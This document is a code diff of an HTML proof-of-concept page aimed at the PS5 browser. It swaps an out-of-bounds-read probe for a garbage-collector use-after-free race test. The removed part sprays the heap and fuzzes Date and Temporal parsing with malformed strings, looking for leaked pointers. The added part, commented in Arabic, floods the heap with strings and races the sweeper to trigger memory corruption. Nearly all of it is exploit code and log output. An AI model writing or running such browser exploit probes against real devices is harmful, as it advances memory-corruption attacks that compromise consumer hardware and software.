@@ -2,158 +2,56 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 Bug 316366 — ISO8601 parseDate OOB Read</title>
+<title>PS5 Heap UAF — Concurrent Marking Race</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting ISO8601 parseDate OOB Read test...\n');
+L('[*] Starting Heap Concurrent Marking UAF test...');
 
-// Step 1: Heap spray with objects to fill adjacent memory with pointers
-L('[*] Step 1: Heap spray with TypedArrays and objects...');
-let spray = [];
-for (let i = 0; i < 10000; i++) {
-    spray.push(new Float64Array(32));
-    spray.push({ a: 1.1, b: 2.2, c: 3.3 });
+// الخطوة 1: إنشاء نصوص كثيرة جداً
+L('[*] Phase 1: Allocating 500,000 strings...');
+let strings = [];
+for (let i = 0; i < 500000; i++) {
+    // نصوص قصيرة لملء الـ IsoHeap بسرعة
+    strings.push("str_" + i + "_AAAAAAAAAAAAAAAAAAAA");
 }
-// Free some to create holes
-for (let i = 0; i < 5000; i++) {
-    spray[i] = null;
-}
-// Force GC
-for (let i = 0; i < 10; i++) {
+L('[+] Strings allocated.');
+
+// الخطوة 2: إجبار جامع القمامة على العمل المتزامن
+// إسقاط المراجع القوية سيجعل النصوص مؤهلة للحذف
+L('[*] Phase 2: Dropping references to trigger GC...');
+strings = null;
+
+// الخطوة 3: محاولة إطلاق Race Condition
+// نقوم بإنشاء نصوص جديدة بسرعة لدفع المؤقت (Sweeper) للعمل
+// بينما خيط الجامع لا يزال يمسح النصوص القديمة
+L('[*] Phase 3: Racing Sweeper timer with Concurrent Marker...');
+
+function raceGC() {
     let tmp = [];
-    for (let j = 0; j < 1000; j++) tmp.push(new ArrayBuffer(4096));
-}
-L('[+] Heap spray complete\n');
-
-// Step 2: Test various short invalid date strings
-// The bug triggers on "short invalid strings"
-// We need to find the exact length that causes the OOB read
-
-L('[*] Step 2: Testing short invalid date strings...\n');
-
-const testStrings = [
-    '',
-    ' ',
-    'a',
-    'ab',
-    'abc',
-    'abcd',
-    'abcde',
-    'abcdef',
-    'abcdefg',
-    'abcdefgh',
-    '\x00',
-    '\x00\x00',
-    '\x00\x00\x00',
-    '\x01',
-    '\x01\x01',
-    '\xff',
-    '\xff\xff',
-    '\xff\xff\xff',
-    '2025',
-    '2025-',
-    '2025-1',
-    '2025-01-',
-    '2025-01-0',
-    'T',
-    'T00',
-    'T00:',
-    'T00:00',
-    'T00:00:',
-    'T00:00:0',
-    '2025T',
-    '2025T0',
-    '-',
-    '--',
-    '---',
-    '+',
-    '++',
-    '+++',
-    'Z',
-    '.',
-    '..',
-    '...',
-    ':',
-    '::',
-    ':::',
-];
-
-for (const str of testStrings) {
-    try {
-        let d = new Date(str);
-        let time = d.getTime();
-        
-        // Check if the result is NaN (invalid date) or a valid timestamp
-        if (isNaN(time)) {
-            // Normal for invalid strings — but did it read OOB?
-            L('  "' + str.replace(/\x00/g, '\\x00').replace(/\xff/g, '\\xff') + '" → Invalid Date (NaN)');
-        } else {
-            // If we get a valid date from a short invalid string, something is wrong
-            L('  [!] "' + str.replace(/\x00/g, '\\x00').replace(/\xff/g, '\\xff') + '" → ' + time + ' (VALID?!)');
-            L('  [!] This should not happen for short invalid strings!');
-            
-            // Check if the timestamp contains leaked data
-            // A valid timestamp from garbage data could be a leaked pointer
-            let high = Math.floor(time / 4294967296);
-            let low = time >>> 0;
-            L('  [!] High 32 bits: 0x' + high.toString(16));
-            L('  [!] Low 32 bits: 0x' + low.toString(16));
-            L('  [!] Possible leaked pointer: 0x' + high.toString(16) + low.toString(16));
-        }
-    } catch (e) {
-        L('  [!] "' + str.replace(/\x00/g, '\\x00').replace(/\xff/g, '\\xff') + '" → Exception: ' + e.message);
+    for (let i = 0; i < 100000; i++) {
+        // إنشاء وتدمير سريع لتوليد ضغط على الذاكرة
+        tmp.push("race_" + i + "_BBBBBBBBBBBBBBBBBBBB");
     }
+    tmp = null;
 }
 
-// Step 3: Try with Temporal API if available
-L('\n[*] Step 3: Testing Temporal API...');
-if (typeof Temporal !== 'undefined') {
-    L('[+] Temporal is available!');
-    
-    const temporalTests = [
-        '',
-        'a',
-        'ab',
-        'abc',
-        '2025',
-        '2025-',
-        '2025-1',
-    ];
-    
-    for (const str of temporalTests) {
-        try {
-            let d = Temporal.PlainDate.from(str);
-            L('  [!] "' + str + '" → ' + d.toString() + ' (VALID?!)');
-        } catch (e) {
-            L('  "' + str + '" → ' + e.name + ': ' + e.message.substring(0, 100));
-            
-            // Check if the error message contains leaked data
-            if (e.message.length > 200) {
-                L('  [!] Long error message — possible data leak!');
-                L('  [!] Message: ' + e.message);
-            }
-        }
-    }
-} else {
-    L('[-] Temporal is not available');
+// تشغيل السباق عدة مرات لزيادة فرصة الـ UAF
+for (let i = 0; i < 10; i++) {
+    L('  [Race attempt ' + (i+1) + '/10]');
+    raceGC();
+    // تأخير بسيط للسماح لخيط الجامع بالبدء
+    // (متصفح PS5 لا يوفر performance.now دقيق، لذا نستخدم حلقة مشغولة)
+    let waste = 0;
+    for (let j = 0; j < 1000000; j++) { waste += j; }
 }
 
-// Step 4: Test with Date.parse() directly
-L('\n[*] Step 4: Testing Date.parse()...');
-for (const str of testStrings.slice(0, 20)) {
-    let result = Date.parse(str);
-    if (!isNaN(result)) {
-        L('  [!] Date.parse("' + str.replace(/\x00/g, '\\x00') + '") = ' + result + ' (should be NaN!)');
-    }
-}
-
-L('\n[*] Test finished.');
-L('[*] If any test showed VALID or leaked data, we found the OOB read.');
-L('[*] The browser may also crash if it reads an unmapped page.');
+L('[+] Race finished.');
+L('[*] If the browser crashed, the UAF in the GC collector thread is confirmed.');
+L('[*] If it survived, the timing window might be too tight or GC is configured differently.');
 </script>
 </body>
 </html>
